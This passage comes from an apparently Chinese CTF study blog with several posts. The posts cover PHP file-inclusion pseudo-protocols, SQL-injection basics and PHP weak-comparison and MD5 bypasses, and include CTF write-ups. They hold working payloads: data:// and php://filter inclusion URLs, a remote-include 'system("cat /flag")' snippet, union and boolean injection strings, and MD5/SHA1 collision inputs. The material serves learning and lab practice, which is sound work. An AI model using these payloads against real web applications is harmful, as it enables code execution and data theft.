3、compress.zlib:&#x2F;&#x2F;file.gz压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：
?file=compress.zlib:///var/www/html/phpinfo.gz



phar:&#x2F;&#x2F;phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容
例如,上传压缩包到目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：
?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt



data:&#x2F;&#x2F;条件

allow_url_fopen:on
allow_url_include :on

作用自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。
用法

data://text/plain,[加上所需传输的经过url编码数据]
data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]

注意：传入时不要加上[ ]
示例：

data:&#x2F;&#x2F;text&#x2F;plain,

http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;


data:&#x2F;&#x2F;text&#x2F;plain;base64,

http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b



使用场景当遇到文件包含可使用伪协议进行
可能遇到的文件包含函数：
includerequireinclude_oncerequire_oncehighlight_fileshow_sourcefliereadfilefile_get_contents file_put_contentsfopen



include和require函数​	通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件(在服务器执行它之前)。
include 和 require 语句是相同的，除了错误处理方面：
require 会生成致命错误(E_COMPILE_ERROR)并停止脚本、include 只生成警告(E_WARNING)，并且脚本会继续
语法：
include &#x27;filename&#x27;;require &#x27;filename&#x27;;

区别：
&lt;?php  include &#x27;23333.php&#x27;;?&gt;

由于23333.php不存在使用include的时候，只会在当前语句报错，然后执行后边的正常语句
&lt;?php  require &#x27;23333.php&#x27;;?&gt;

但是使用require的时候，就会直接报错然后跳出函数。
include_once和require_once函数​	include_once (require_once)语句在脚本执行期间包含并运行指定文件。此行为和 include (require)语句类似，区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。
&lt;?phprequire &#x27;1.php&#x27;;require &#x27;1.php&#x27;;?&gt;

这种情况下1.php被包含两次。
&lt;?phprequire &#x27;1.php&#x27;;require_once &#x27;1.php&#x27;;?&gt;

这种情况下，第二次包含时，是不会进行包含的。
highlight_file()和show_source()两个函数的用法相同，因为show_source()是highlight_file()的别名
show_source(filename,return);highlight_file(filename,return);

其中return是可选项



参数
描述



filename
必需。要进行高亮处理的 PHP 文件的路径。


return
可选。如果设置 true，则本函数返回高亮处理的代码，而不是输出它们。


​	​	
readfile和file_get_contents和file三者区别：



名称
作用



file
把整个文件读入一个数组中


readfile
读入一个文件并写入到输出缓冲。


file_get_contents
将整个文件读入一个字符串


注：以下提到的PHP 的内置路径（include_path）为在php.ini的php配置文件中进行设置的搜索路径。
file_get_contentsfile_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。
file_get_contents(path,include_path,context,start,max_length)




参数
描述



path
必需。规定要读取的文件。


include_path
可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。


context
可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。


start
可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。


max_length
可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。


readfilereadfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。
readfile(filename,include_path,context)




参数
描述



filename
必需。规定要读取的文件。


include_path
可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。


context
可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。


file与 file_get_contents() 类似，不同的是 file() 将文件读取后作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。
file(path,include_path,context)




参数
描述



path
必需。规定要读取的文件


include_path
可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”


context
可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 null，则忽略。


file_put_contentsfile_put_contents() 函数把一个字符串写入文件中。
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )




参数
功能



filename
必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件


data
必需。规定要写入文件的数据。可以是字符串、数组或数据流


flag
可选。规定如何打开&#x2F;写入文件。可能的值： FILE_USE_INCLUDE_PATH ：只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）搜索文件。FILE_APPEND：如果设置了该标志，数据将被追加到文件末尾而不是覆盖文件内容。 LOCK_EX：如果设置了该标志，在写入文件时会获取一个独占锁定（排它锁），以防止其他进程同时写入文件。这可以确保在多个进程同时写入文件时不会发生冲突。


context
可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。


该函数访问文件时，遵循以下顺序：	

如果设置了 FILE_USE_INCLUDE_PATH 标志，函数将首先检查 filename 参数的副本是否存在于 PHP 的内置路径（include_path）中。
函数将打开文件以进行写入操作。
如果设置了 LOCK_EX 标志，函数将对文件进行锁定（获取独占锁定），以确保在写入文件时不会发生冲突。
如果设置了 FILE_APPEND 标志，函数将将写入的数据追加到文件末尾。否则，函数将清除文件的内容并写入新的数据。
函数将写入数据到文件中。
函数将关闭文件并释放对文件的所有锁定。

​	​	
fopenfopen() 函数打开一个文件或 URL。
fopen(filename,mode,include_path,context)






参数
描述



filename
必需。规定要打开的文件或 URL。


mode
必需。规定您请求到该文件&#x2F;流的访问类型。可能的值：”r” （只读方式打开，将文件指针指向文件头）”r+” （读写方式打开，将文件指针指向文件头）”w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）”w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）”a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）”a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）”x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）”x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）


include_path
可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。


context
可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。


参考文章
参考PHP 手册的内容原文链接：PHP: 可用过滤器列表 - Manual
参考菜鸟教程的文章原文链接：https://www.runoob.com/php/func-filesystem-fopen.html

实战No.1 土豆哥给的题目&lt;?phphighlight_file(__FILE__);error_reporting(0);print(&quot;easy lfi, but no flag~~&quot;);$cmd = $_POST[&#x27;cmd&#x27;];//flag in /flagif (isset($cmd)) &#123;    print (&quot;first one:&quot; . &quot;&lt;br&gt;&quot;);    $cmd = preg_replace(&quot;/flag/i&quot;, &#x27;&#x27;, $cmd);    echo $cmd;    if (preg_match(&quot;/flag/i&quot;, $cmd)) &#123;        include($cmd);    &#125;&#125; 

土豆哥：flag一般在根目录下(根本没听到,做了很多无用功，但偶然接触到了一句话木马)
题解： 
​	$cmd = preg_replace(&quot;/flag/i&quot;, &#39;&#39;, $cmd);这个正则表达式用于删除cmd中含有flag地方，第二个  if (preg_match(&quot;/flag/i&quot;, $cmd))用来判断是否含有flag这个词如果有则进行if下的内容。
​	按题目的含义我们可以构造出flflagag这个作为flag的替代
​	尝试直接进行cmd=/flflagag进行传参，发现并没有出现参数，判读估计进行了隐藏。使用php中的php:&#x2F;&#x2F;filter伪协议进行读取，使用cmd=php://filter/read=convert.base64-encode/resource=/flag尝试使用base64加密后读取。
​	页面出现经过base64加密后的内容
PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw==

解密
&lt;?php$FLAG = &quot;ROIS&#123;doudoubleble_cmcmdd_wiwinn&#125;&quot;;

发现flag是个变量无法直接通过include包含直接读出。
No.2 CTFHub 技能树-RCE-文件包含-远程包含&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;

页面给了个小提示
phpinfo



Directive
Local Value
Master Value



allow_url_fopen
On
On


allow_url_include
On
On


题解：
查看题目
​	 if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;))发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件，里面写入能进行打印出根目录下flag的代码，如：
&lt;?php system(&quot;cat /flag&quot;); ?&gt;

使用http://协议，最后成功获取代码
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-基础</title>
    <url>/posts/3000552397/</url>
    <content><![CDATA[SQL注入流程
找到注入点：判断是否有漏洞，寻找插入位置
构造注入语句，并在注入点注入形成新的SQL语句
新形成的SQL语句提交数据库处理
数据库执行新的SQL语句，引发注入攻击

前置知识1.特别的数据库
在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。

schemata表存储该用户创建的所有数据库的库名。
   &gt;&gt;&gt;&gt;其中记录数据库库名的字段名为：schema_name。

tables表存储该用户创建的所有数据库的库名和表名。
  &gt;&gt;&gt;&gt;其中记录数据库库名和表名的字段名分别是：tables_schema和table_name。

columns表存储该用户创建的所有数据库的库名、表名和字段名。
  &gt;&gt;&gt;&gt;其中记录数据库库名、表名和字段名的字段名分别是：tables_schema、table_name和column_name。


2.注释符
  在MySQL中，常见注释符的表达方式：
​	   # …… ：#号后面的都会被注释
​	   -- …… ：--号后面的都会被注释，不过在 -- 的前后都需要加空格再加数据(GET传参时只能使用--，后的空格用+代替)
​	   /* ... */ ：在查询语句中使用斜杠星号注释，从 &#x2F; 开始到 *&#x2F; 结束的部分都被视为注释，不会被执行。


但**/* ... */** 的特殊用法--条件注释

条件注释是一种特殊的注释语法，它允许在注释中使用关键字，而这些关键字在执行查询时会被解析为相应的操作。
语法格式为：
/*!&lt;conditional_keyword&gt; &lt;query_part&gt; */

   例如：index?id=-10 /*!union*/ /*!select*/ 1,2,3等同于index?id=-10 union select 1,2,3
SQL注入常用基础语句select version(); #查看数据库版本 select user(); #查看数据库用户select database(); #查看当前库名;select table_name from information_schema.tables where table_schema=database() ; #查看当前库下的表名select group_concat(table_name) from information_schema.tables where table_schema=database() ; #只回显一行数据下查看当前库下的全部表名select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;xxx&#x27;; #查询列名-把xxx缓存前面查询到的表名



SQL注入常用函数联合查询(union)注入使用1.concat()函数
​	concat()函数：将多个不同字段的字符串连接成一个字符串。
concat(str1，str2) #语法

注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
2.group_concat()函数
​	group_concat() 将多个同个字段的字符串连接成一个字符串。
group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法

报错注入使用1.extractvalue()函数
​	从 MySQL 5.7.8 版本开始，ExtractValue() 函数已被弃用
​	ExtractValue() 函数来提取 XML 字符串中的特定路径的值。
ExtractValue(xml_string, xpath_expression)


xml_frag：xml文档对象的名称，是一个string类型。
xpath_expr：使用xpath语法格式的路径。

2.updataxml()函数

xml_target：xml文档对象的名称，是一个string类型。
xpath_expr：使用xpath语法格式的路径。
new_xml：需要更新的内容。

3.count()+rand()+floor()+group by()函数
rand()函数：rand()返回0到1的随机数。rand(0)返回一个固定的0到1的伪随机数。
floor()函数：floor(x)返回小于或等于 x 的最大整数。
group by语句：group by语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。
布尔盲注使用1.substr()/substring()函数
​	substr()/substring()函数：用来截取数据库某个字段中的一部分。
substr(string，start开始位置，length截取长度)  #语法

参数

string：必选，数据库中需要截取的字段
start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。
length：可选，需要截取的长度。缺省。即截取到结束位置

2.ascii()函数
​	ascii()函数：返回字符串str的最左边的数值。
ascii(str)  #语法

2.length() 函数，返回字符串的长度
length(str) #语法







注入点分类①数字型注入点类似的后端语句
$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);

 在 Web 端大概是 http://xxx.com/index.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。
用1 and 1=1进行组合出来的sql注入语句为：
select * from news where id=1 and 1=1



②字符型注入点类似的后端语句
$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);

 在 Web 端大概是 http://xxx.com/index.php?id=admin 这种形式，其注入点id 类型为字符类型，所以叫字符型注入点。
使用id=1&#39; and 1=1 --+组合出来的sql注入语句为：
select * from news where id=&#x27;admin&#x27; and 1=1 --+&#x27; LIMIT 0,1&quot;;

 注意多了一个引号。由于注入拼接语句后多了一个&#39;,需要用注释符进行消除对语句的影响
③搜索型注入点这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段 like &#x27;%关键字%&#x27;`。组合出来的sql注入语句为：select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;





判断注入点注意区别语句报错与页面报错、页面数据不正确的区别
​	1.?id=1 and 1=1 和?id=1 and 1=2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。
​	2.?id=1&#39; and 1=1 --+ / #和?id=1&#39; and 1=2 --+ / #或使用?id&#39; and &#39;1&#39;=&#39;1和?id&#39; and &#39;1&#39;=&#39;2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。
​	3.?id=1%&#39; and 1=1 --+ / #和?id=1%&#39; and 1=2 --+ / #进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。
注入方法]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-PHP验证</title>
    <url>/posts/2808981175/</url>
    <content><![CDATA[PHPPHP中的比较符php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。
在php中有两种比较符号: 一种是 弱等于，另外一种是 强等于，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:

弱等于
在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。

==：等于比较符号。用于比较两个值是否相等，不考虑数据类型。

!= 或 &lt;&gt;：不等于比较符号。用于比较两个值是否不相等，不考虑数据类型。

&lt;：小于比较符号。用于比较两个值的大小，如果左侧的值小于右侧的值，则条件为真。

&gt;：大于比较符号。用于比较两个值的大小，如果左侧的值大于右侧的值，则条件为真。

&lt;=：小于等于比较符号。用于比较两个值的大小，如果左侧的值小于或等于右侧的值，则条件为真。

&gt;=：大于等于比较符号。用于比较两个值的大小，如果左侧的值大于或等于右侧的值，则条件为真。



强等于
在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。

===：全等比较符号。用于比较两个值是否相等，并且数据类型也相同。
!==：不全等比较符号。用于比较两个值是否不相等，或者数据类型不相同。



弱等于转化规则规则1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字（最开头的部分），则其值就是开始的数字，否则（包括后面出现数字的情况），其值为0。例如:
12==&quot;12&quot;                         // true12==&quot;12aa&quot;                       //true&quot;admin&quot;==0		     	       //truefalse == &quot;&quot; == 0 == NULL		//true

2.布尔值true和任意字符串都弱相等。例如:
true==&quot;wells&quot;                     //true

3.数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；    0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；
绕过MD5验证弱类型比较0e绕过原理：若使用PHP的弱比较时，0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0
例：
md5(&#x27;QNKCDZO&#x27;) == md5(240610708)

MD5加密后得到
0e830400451993494058024219903391 == 0e462097431906509019562988736854  //即0==0，为true



常用MD5加密后为0e的字符串QNKCDZO240610708byGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a



强类型比较数组绕过原理：MD5无法加密数组，使用数组虽然会报错，返回了null，null&#x3D;&#x3D;null
使用方法
a[]=a&amp;b[]=b 



强类型绕过（MD5碰撞）原理：使用两个数值不同但MD5值相同的字符串（以下字符串经过URL编码）
--------------------c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2--------------------param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2    param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2------------------- Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2    Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2--------------------    --------------------$s1 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab$s2 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab$s3 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab--------------------

拓:sha1加密的两个相同值array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1



MD5-SQL注入题目类似于
&lt;?phpsql=&quot;select * from admin where password=&#x27;&quot;.md5($pass,true).&quot;&#x27;&quot;;?&gt;

一个ticker：字符串：ffifdyop的md值为
&#x27;or&#x27;6�]��!r,��b

拼凑到sql语句中变成了
select * from &quot;admin&quot; where password=&#x27;&#x27;or&#x27;6�]��!r,��b&#x27;

由于非空字符串认为真，所有实现了sql注入
参考文章
参考**CSDN博主[yจุ๊บng]**的文章
原文链接：总结ctf中 MD5 绕过的一些思路_ctf md5-CSDN博客


实战1.攻防世界-simple_php&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123;  echo $flag1;&#125;if(is_numeric($b))&#123;  exit();&#125;if($b&gt;1234)&#123;  echo $flag2;&#125;?&gt;

此处使用任意开头不含数字的字符串可使a的相关条件通过。

第一个条件：由于a是弱比较，此时任意开头不含数字的字符串被当成0进行比价
第二个条件：a不为空（非空字符串），则条件为真。如果a 是一个空字符串，条件将为假。

此处使用开头含数字且数字大于1234的字符串可使b的相关条件通过。

第一个条件：要求b不能是一个数字或者是全由数字构成的字符串
第二个条件：此时进行若比较，开头含数字且数字大于1234的字符串会被作为数字进行比较

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMap</title>
    <url>/posts/3150507853/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
